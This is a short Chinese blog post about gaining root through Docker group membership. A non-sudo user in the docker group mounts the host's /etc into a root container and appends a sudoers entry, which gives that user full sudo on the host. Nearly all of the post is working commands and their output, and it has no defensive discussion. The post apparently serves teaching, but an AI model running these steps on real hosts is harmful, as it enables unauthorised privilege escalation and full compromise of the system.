---
layout: post
title: "Docker提权案例"
subtitle: "介绍一种docker提权场景"
date: 2022-06-21
author: "Cheney.Yin"
header-img: "//i.328888.xyz/2023/03/25/iADI63.jpeg"
tags:
 - Docker
 - 提权
 - 用户组
 - sudo
---

# docker 提权案例

假设存在用户`tom`，该用户无法`sudo`，但属于`docker`组。
首先，创建用户，

```shell
sudo useradd -m tom
```
查看用户当前信息，
```shell
id tom
uid=1002(tom) gid=1002(tom) groups=1002(tom)
```
将用户加入到`docker`组，
```shell
sudo gpasswd -a tom docker
Adding user tom to group docker
```
查看用户信息，可以看到已经成功加入组。
```shell
id tom
uid=1002(tom) gid=1002(tom) groups=1002(tom),1001(docker)
```
切换登录`tom`，可以成功执行`docker`相关命令。
```shell
su tom
[tom@cheney-hp cheney]$ docker ps -a
CONTAINER ID   IMAGE      COMMAND                  CREATED        STATUS                           PORTS     NAMES
5facb46f63a9   registry   "/entrypoint.sh /etc…"   20 hours ago   Exited (2) 19 hours ago                    registry
e27bbc62b96c   busybox    "sh"                     25 hours ago   Exited (137) About an hour ago             busybox
```
目前，用户`tom`无法执行`sudo`。
```shell
sudo ip addr
tom is not in the sudoers file.  This incident will be reported.
```

接下来，我们借助`docker`进行提权。

```shell
[tom@cheney-hp cheney]$ docker run -itd -v /etc:/etc --name ubuntu ubuntu /bin/bash
b0483f78382d8413a7a6d6e9bc8ceb62fe8819c3ffced1907d7fac95b3034e66
```

 把本地`/etc`映射进容器，进入容器后，登录用户为`root`。

```shell
[tom@cheney-hp cheney]$ docker exec -it ubuntu /bin/bash
root@b0483f78382d:/#
```

在容器内把`tom`加入到`sudoers`文件，

```shell
root@b0483f78382d:/# echo 'tom ALL=(ALL) ALL' >> /etc/sudoers
```

退出容器，测试是否可以正常执行`sudo`。

```shell
[tom@cheney-hp cheney]$ sudo ip addr
[sudo] password for tom:
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever
```

背后原理，后续补充。
